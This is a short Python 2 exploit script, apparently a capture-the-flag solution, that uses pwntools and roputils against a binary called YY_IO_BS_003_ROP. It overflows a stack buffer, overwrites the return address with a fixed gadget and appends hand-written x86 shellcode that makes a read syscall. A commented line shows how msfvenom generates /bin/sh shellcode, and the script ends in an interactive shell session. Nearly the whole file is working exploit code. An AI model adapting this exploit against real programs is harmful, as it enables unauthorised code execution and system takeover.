#!/usr/bin/env python
# -*- coding: utf-8 -*-
# @Date    : 2017-04-22 00:19:09
# @Author  : WinterSun (511683586@qq.com)
# @Link    : https://Winter3un.github.io/
import roputils
from pwn import *
context(log_level="debug")
DEBUG = 1
target = "./YY_IO_BS_003_ROP"
remote_ip = ""
port = 0
rop = roputils.ROP(target)
bss = rop.section('.data')
# rop.got('puts')
# msfvenom -p linux/x86/exec CMD=/bin/sh -f python -b '\x00\x0b\x0d\x0a'


if DEBUG:
	p = process(target)
	gdb.attach(p,"b*0x08048E8F\nc")
else:
	p = remote(remote_ip,port)

def sl(data):
	p.sendline(data)
def sd(data):
	p.send(data)
def ru(data):
	return p.recvuntil(data)

# raw_input()
def gen(eip):
	ru("\n")
	shellcode = p32(0x41424344)
	payload = "b"*(0x13+0x4)+eip
	payload +="b"*(0x100-len(payload))
	payload += shellcode
	sd(payload)
	import base64
	print base64.b64encode(payload)
# gen(rop.call("read",0,0x080ea040,4))
payload =p32(0x080e2ac3)
rop = "\x31\xdb\xf7\xe3\x53h@\xa0\x0e\x08Y\xb2\x04\xb0\x03\xcd\x80"
gen(payload+rop)

# shellcode = "[Result]:%X"
# gen(rop.call("read",0,bss,len(shellcode))+rop.call("write",1,0x8049010,4))
p.interactive()

